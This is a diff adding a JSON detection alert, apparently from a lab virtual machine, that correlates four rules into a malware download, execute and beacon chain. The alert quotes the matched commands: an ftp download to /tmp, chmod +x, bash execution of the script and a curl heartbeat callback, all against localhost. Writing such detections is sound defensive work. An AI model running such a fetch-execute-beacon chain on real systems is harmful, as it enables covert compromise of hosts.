@@ -1,0 +1,108 @@
+{
+  "detection_name": "Potential Malware Download And Execution Chain",
+  "correlation_window_minutes": 15,
+  "host": "bunny-VirtualBox",
+  "user": "bunny",
+  "triggered_rules": [
+    {
+      "rule_name": "File Download To Writable Location",
+      "rule_id": "9db1f59f-f4a7-4d85-8f79-6df23f8f7001",
+      "matched_fields": {
+        "Image": "/usr/bin/ftp",
+        "CommandLine": "ftp 127.0.0.1",
+        "DownloadedFile": "/tmp/update.sh",
+        "DestinationPath": "/tmp/update.sh"
+      },
+      "matched_conditions": [
+        "download_tool_detected",
+        "user_writable_location_detected"
+      ]
+    },
+    {
+      "rule_name": "Executable Permission Added",
+      "rule_id": "43a78b85-a0ec-40d4-a1b1-c86cb5b5b002",
+      "matched_fields": {
+        "Image": "/usr/bin/chmod",
+        "CommandLine": "chmod +x /tmp/update.sh",
+        "TargetFile": "/tmp/update.sh"
+      },
+      "matched_conditions": [
+        "chmod_detected",
+        "executable_permission_added"
+      ]
+    },
+    {
+      "rule_name": "Execution From Writable Location",
+      "rule_id": "c4b958e5-9384-4f2e-a6c9-5f32cf5c1003",
+      "matched_fields": {
+        "Image": "/usr/bin/bash",
+        "CommandLine": "/bin/bash /tmp/update.sh",
+        "CurrentWorkingDirectory": "/tmp",
+        "ExecutedFile": "/tmp/update.sh"
+      },
+      "matched_conditions": [
+        "shell_execution_detected",
+        "execution_from_temporary_directory"
+      ]
+    },
+    {
+      "rule_name": "Suspicious Callback Activity",
+      "rule_id": "0a45e19c-c90e-4ca0-b4f1-7f67fdd2f004",
+      "matched_fields": {
+        "Image": "/usr/bin/curl",
+        "CommandLine": "curl -s http://127.0.0.1:8080/heartbeat?host=bunny-VirtualBox",
+        "DestinationIP": "127.0.0.1",
+        "DestinationPort": 8080,
+        "URI": "/heartbeat"
+      },
+      "matched_conditions": [
+        "network_tool_detected",
+        "callback_pattern_detected"
+      ]
+    }
+  ],
+  "correlation_matches": {
+    "download_stage": {
+      "timestamp": "2026-06-05T17:37:08Z",
+      "process": "ftp",
+      "artifact": "/tmp/update.sh"
+    },
+    "permission_change_stage": {
+      "timestamp": "2026-06-05T17:44:39Z",
+      "process": "chmod",
+      "artifact": "/tmp/update.sh"
+    },
+    "execution_stage": {
+      "timestamp": "2026-06-05T17:46:14Z",
+      "process": "bash",
+      "artifact": "/tmp/update.sh"
+    },
+    "beaconing_stage": {
+      "timestamp": "2026-06-05T17:46:44Z",
+      "process": "curl",
+      "destination": "127.0.0.1:8080",
+      "uri": "/heartbeat"
+    }
+  },
+  "triggering_behavior_chain": [
+    "File downloaded from remote source",
+    "File stored in writable location",
+    "Executable permission added",
+    "Downloaded file executed",
+    "Outbound callback initiated",
+    "Beaconing behavior observed"
+  ],
+  "risk_factors": [
+    "Payload staged in temporary directory",
+    "Executable bit added after download",
+    "Execution occurred shortly after download",
+    "Network communication initiated by downloaded script",
+    "Periodic callback behavior observed"
+  ],
+  "detection_result": {
+    "correlation_triggered": true,
+    "confidence": "high",
+    "severity": "high",
+    "verdict": "malicious"
+  }
+}
